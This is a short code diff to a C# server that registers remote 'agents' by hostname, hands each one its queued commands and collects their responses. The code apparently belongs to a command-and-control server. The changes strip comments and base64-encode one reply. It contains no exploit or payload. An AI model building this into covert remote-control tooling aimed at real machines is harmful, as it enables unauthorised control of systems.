@@ -131,7 +131,6 @@ namespace server{
             //attempt to register the client based off of request
             //check if the property exists
 
-            //should PROBABLY be a SWITCH
             if (root.TryGetProperty("register", out JsonElement register)){
                 //register the agent
                 int registration = await RegisterAgent(hostname, root);
@@ -141,7 +140,6 @@ namespace server{
                 return "{\"registered\":\"false\"}";
             } else if (root.TryGetProperty("command", out JsonElement query)){
                 //respond to the client who wants their commandQue
-                //should really be a hash table
                 LogServer($"command query from {hostname}");
                 if (this.agents.TryGetValue(hostname.GetString(), out Agent agent)){
                     var jsonCommandQue = JsonSerializer.Serialize(agent.commandQue);
@@ -151,17 +149,10 @@ namespace server{
                 return "{\"response\": \"Client not found!\"}";
             } else if (root.TryGetProperty("response", out JsonElement response)) {
                 //get and parse a client response
-                
-                /*
-                var test = new Table();
-                test.AddColumn("response");
-                test.AddRow(response.ToString());
-                AnsiConsole.Write(test);
-                */
                 this.agents[hostname.GetString()].commandResp.Add(response.ToString());
-                return "{\"response\": \"thanks\"}";
+                return Convert.ToBase64String(Encoding.ASCII.GetBytes("{\"response\": \"thanks\"}"));
             } else {
-                return "404";
+                return HttpStatusCode.NotFound.ToString();
             }
         }
 
